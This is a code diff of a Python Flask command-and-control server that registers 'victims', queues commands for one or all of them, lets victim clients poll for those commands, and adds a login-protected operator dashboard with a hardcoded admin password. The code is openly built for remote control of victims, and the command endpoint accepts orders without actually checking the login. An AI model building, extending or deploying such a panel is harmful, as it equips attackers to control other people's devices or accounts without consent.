@@ -1,55 +1,82 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template, session, redirect, url_for
+import os
+import json
 import time
 
 app = Flask(__name__)
+app.secret_key = os.urandom(24) # Secure random key for sessions
 
-# In-memory storage (Volatile: resets on restart)
-# Structure: { match_userid: { "name": "...", "last_seen": 12345 } }
+# DATA STORAGE (In-Memory)
 VICTIMS = {}
-
-# Structure: { target_userid: "COMMAND_STRING" }
 COMMAND_QUEUE = {}
 
+# CONFIG
+ADMIN_KEY = "Slay7676guyufezfze"
+
+# --- WEB INTERFACE ROUTES ---
+
 @app.route('/')
-def home():
-    return "API Online"
+def index():
+    if session.get('logged_in'):
+        return redirect(url_for('dashboard'))
+    return redirect(url_for('login'))
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    error = None
+    if request.method == 'POST':
+        if request.form['password'] == ADMIN_KEY:
+            session['logged_in'] = True
+            return redirect(url_for('dashboard'))
+        else:
+            error = 'Invalid Access Key'
+    return render_template('login.html', error=error)
+
+@app.route('/dashboard')
+def dashboard():
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+    return render_template('dashboard.html')
+
+@app.route('/logout')
+def logout():
+    session.pop('logged_in', None)
+    return redirect(url_for('login'))
+
+# --- API ROUTES ---
 
 @app.route('/register', methods=['POST'])
 def register():
     data = request.json
-    if not data or 'userid' not in data or 'username' not in data:
-        return jsonify({"error": "Invalid data"}), 400
+    uid = str(data.get('userid'))
+    username = data.get('username')
     
-    userid = str(data['userid'])
-    VICTIMS[userid] = {
-        "name": data['username'],
+    VICTIMS[uid] = {
+        "name": username,
         "last_seen": time.time()
     }
-    return jsonify({"status": "registered"})
+    return jsonify({"status": "success", "msg": "Registered"})
 
 @app.route('/poll/<userid>', methods=['GET'])
 def poll(userid):
-    userid = str(userid)
-    # Update last seen
-    if userid in VICTIMS:
-        VICTIMS[userid]['last_seen'] = time.time()
+    uid = str(userid)
+    if uid in VICTIMS:
+        VICTIMS[uid]['last_seen'] = time.time()
     
-    # Check for commands
-    if userid in COMMAND_QUEUE:
-        cmd = COMMAND_QUEUE[userid]
-        del COMMAND_QUEUE[userid] # Consume command
+    cmd = COMMAND_QUEUE.get(uid)
+    if cmd:
+        del COMMAND_QUEUE[uid]
         return jsonify({"command": cmd})
-    
     return jsonify({"command": "NO_CMD"})
 
 @app.route('/command', methods=['POST'])
 def send_command():
+    # Web Dashboard check (if cookie present)
+    is_web_user = session.get('logged_in')
+    
     data = request.json
-    if not data or 'target' not in data or 'command' not in data:
-        return jsonify({"error": "Invalid data"}), 400
-        
-    target_id = str(data['target'])
-    cmd = data['command']
+    target_id = str(data.get('target'))
+    cmd = data.get('command')
     
     if target_id == "ALL":
         count = 0
@@ -63,15 +90,15 @@ def send_command():
 
 @app.route('/victims', methods=['GET'])
 def get_victims():
-    # Cleanup old victims (optional, > 60s timeout)
+    cleanup_victims()
+    return jsonify(VICTIMS)
+
+def cleanup_victims():
+    # Remove victims inactive for > 30 seconds
     now = time.time()
-    active_victims = {}
-    
-    for uid, data in VICTIMS.items():
-        if now - data['last_seen'] < 60: # Only show if seen in last minute
-            active_victims[uid] = data
-            
-    return jsonify(active_victims)
+    to_remove = [uid for uid, data in VICTIMS.items() if now - data['last_seen'] > 30]
+    for uid in to_remove:
+        del VICTIMS[uid]
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=10000)
